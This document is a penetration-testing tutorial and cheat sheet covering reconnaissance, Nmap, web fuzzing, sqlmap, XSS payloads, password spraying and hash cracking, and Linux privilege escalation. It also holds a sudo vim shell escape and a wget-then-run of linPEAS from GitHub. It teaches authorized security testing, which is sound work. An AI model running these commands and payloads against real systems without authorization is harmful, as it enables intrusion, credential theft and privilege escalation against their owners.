# Ethical Hacking & Penetration Testing

Penetration testing (pen testing) is the authorized simulation of cyberattacks to identify vulnerabilities before malicious actors do. Ethical hackers use the same tools and techniques as attackers — but with permission and for defensive purposes.

## Legal and Ethical Foundation

**CRITICAL: Never test systems without explicit written authorization.**

Before any pen test:
- **Signed scope document** — defines exactly what systems can be tested
- **Rules of engagement** — time windows, allowed techniques, emergency contacts
- **Get it in writing** — verbal permission is not enough legally

Types of authorization:
- **White box** — full knowledge of architecture, credentials, source code
- **Grey box** — partial knowledge (user-level access, some architecture info)
- **Black box** — no knowledge, simulates external attacker

## Penetration Testing Methodology

```
Phase 1: Reconnaissance (Information Gathering)
  │
  ├── Passive: OSINT, public records, DNS, social media
  └── Active: Port scanning, service enumeration

Phase 2: Scanning & Enumeration
  │
  ├── Network scan (Nmap)
  ├── Vulnerability scan (Nessus, OpenVAS)
  └── Service enumeration (banner grabbing, version detection)

Phase 3: Exploitation
  │
  ├── Exploit known vulnerabilities (CVEs)
  ├── Password attacks (brute force, credential stuffing)
  └── Web application attacks (SQLi, XSS, SSRF)

Phase 4: Post-Exploitation
  │
  ├── Privilege escalation
  ├── Lateral movement
  └── Persistence (demonstrate attacker capability)

Phase 5: Reporting
  │
  ├── Executive summary (business risk)
  ├── Technical findings (detailed with evidence)
  └── Remediation recommendations
```

## Reconnaissance — OSINT

```bash
# DNS enumeration
nslookup -type=MX target.com
nslookup -type=TXT target.com        # SPF, DKIM records
dig target.com ANY                    # All DNS records
dnsrecon -d target.com               # Comprehensive DNS recon
amass enum -d target.com             # Subdomain enumeration
subfinder -d target.com              # Fast subdomain discovery

# Find subdomains
# target.com → api.target.com, admin.target.com, vpn.target.com

# WHOIS
whois target.com                      # Registration info, nameservers

# Certificate transparency (reveals subdomains)
# https://crt.sh/?q=%.target.com

# Google dorking
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com "index of"
# "target.com" "password" site:pastebin.com

# theHarvester — emails, hosts, subdomains
theHarvester -d target.com -b google,linkedin,bing

# Shodan — internet-connected device search
shodan search "org:TargetCompany"
shodan search "ssl:target.com"
```

## Network Scanning with Nmap

```bash
# Basic scans
nmap target.com                       # Basic scan (top 1000 ports)
nmap -sV target.com                   # Version detection
nmap -sV -sC target.com              # Scripts + version (default scripts)
nmap -A target.com                    # Aggressive (OS, version, script, traceroute)
nmap -p- target.com                   # All 65535 ports
nmap -p 80,443,8080,8443 target.com  # Specific ports

# Scan types
nmap -sS target.com                   # SYN scan (stealth, default root)
nmap -sT target.com                   # TCP connect scan
nmap -sU target.com                   # UDP scan (slow)
nmap -sn 192.168.1.0/24              # Ping sweep (host discovery)

# Output
nmap -oA results target.com           # All formats (XML, text, grepable)
nmap -oX results.xml target.com      # XML only

# Timing (T1=slow/stealthy, T4=fast, T5=insane)
nmap -T4 target.com                   # Fast scan

# Useful NSE scripts
nmap --script=http-title target.com
nmap --script=ssl-cert target.com
nmap --script=smb-enum-shares target.com
nmap --script vuln target.com         # Check for known vulnerabilities
```

## Web Application Testing

```bash
# Directory/file enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u https://target.com -w wordlist.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Parameter fuzzing
ffuf -u "https://target.com/api?FUZZ=test" -w params.txt

# Subdomain fuzzing
ffuf -u https://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"

# Nikto — web server scanner
nikto -h https://target.com

# SQL injection testing
sqlmap -u "https://target.com/product?id=1" --dbs
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --forms
# ALWAYS get authorization before using sqlmap!

# XSS payloads (manual testing)
# <script>alert('XSS')</script>
# <img src=x onerror=alert(1)>
# javascript:alert(1)

# Burp Suite for intercepting and modifying requests
# Community edition is free — use for manual web testing
```

## Password Attacks

```bash
# Password spraying (one password, many users)
# Less likely to trigger lockout than brute force
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!'

# Hash cracking with Hashcat
hashcat -m 1000 hash.txt wordlist.txt           # NTLM hashes
hashcat -m 0 hash.txt wordlist.txt              # MD5
hashcat -m 1800 hash.txt wordlist.txt           # SHA-512 crypt

# Hash cracking with John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --rules --wordlist=wordlist.txt hash.txt   # With rules (mutations)

# Common wordlists
# /usr/share/wordlists/rockyou.txt (14M passwords)
# SecLists: https://github.com/danielmiessler/SecLists

# Default credentials
# admin/admin, admin/password, root/root
# Always check vendor defaults for network devices
```

## Privilege Escalation — Linux

```bash
# System information
whoami && id
uname -a
cat /etc/os-release

# Find SUID binaries (run as owner)
find / -perm -4000 -type f 2>/dev/null
# Check GTFOBins: https://gtfobins.github.io

# Writable files/directories
find / -writable -type f 2>/dev/null | grep -v proc
find /etc -writable 2>/dev/null

# Sudo permissions
sudo -l                               # What can this user sudo?
# If: (ALL) NOPASSWD: /usr/bin/vim
# Then: sudo vim -c ':!/bin/bash'

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Kernel exploits
uname -r                              # Kernel version
# Search for CVEs against this version
# DirtyCow (CVE-2016-5195), PwnKit (CVE-2021-4034)

# PATH hijacking
echo $PATH
# If writable dir in PATH before system dirs: place malicious binary

# Automated enumeration
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

## Penetration Test Report Structure

```
EXECUTIVE SUMMARY (1-2 pages for management)
├── Engagement overview and scope
├── Overall risk rating (Critical/High/Medium/Low)
├── Key findings summary (business impact language)
└── Top 3-5 recommendations

TECHNICAL FINDINGS (for security team)
├── Finding #1: [Name] — CRITICAL
│   ├── Description
│   ├── Evidence (screenshots, tool output)
│   ├── Business impact
│   ├── CVSS Score (if applicable)
│   ├── Affected systems
│   ├── Remediation steps (specific)
│   └── References (CVE, OWASP)
├── Finding #2: [Name] — HIGH
└── ... (sorted by severity)

METHODOLOGY
└── Tools used, phases followed, dates/times

APPENDICES
├── Full scan outputs
├── Tool configurations
└── Raw evidence
```

## Common Certifications

| Certification | Provider | Level | Focus |
|--------------|---------|-------|-------|
| CEH | EC-Council | Intermediate | Methodology, concepts |
| OSCP | Offensive Security | Advanced | Hands-on exploitation |
| eJPT | eLearnSecurity | Beginner | Entry-level practical |
| CompTIA PenTest+ | CompTIA | Intermediate | Broad pen testing |
| GPEN | GIAC | Advanced | Pen testing techniques |

## Interview Questions

**What is the difference between vulnerability scanning and penetration testing?**
Vulnerability scanning is automated — tools like Nessus or OpenVAS scan systems and report known vulnerabilities based on version numbers and signatures. It's wide but shallow. Penetration testing is manual and contextual — a human tester actively tries to exploit vulnerabilities, chain multiple weaknesses together, bypass controls, and demonstrate real impact. Vuln scanning tells you what MIGHT be exploitable; pen testing shows what IS exploitable in your specific environment.

**What is privilege escalation and how do you test for it?**
Privilege escalation is gaining higher permissions than initially granted — typically from regular user to administrator/root. Horizontal: moving to another user's account. Vertical: gaining admin/root. Testing approach: start with low-privilege access, enumerate SUID binaries (GTFOBins), check sudo permissions (`sudo -l`), look for writable cron jobs, check for stored credentials, test for kernel CVEs, check for PATH hijacking opportunities, and use automated tools like LinPEAS/WinPEAS for comprehensive enumeration.
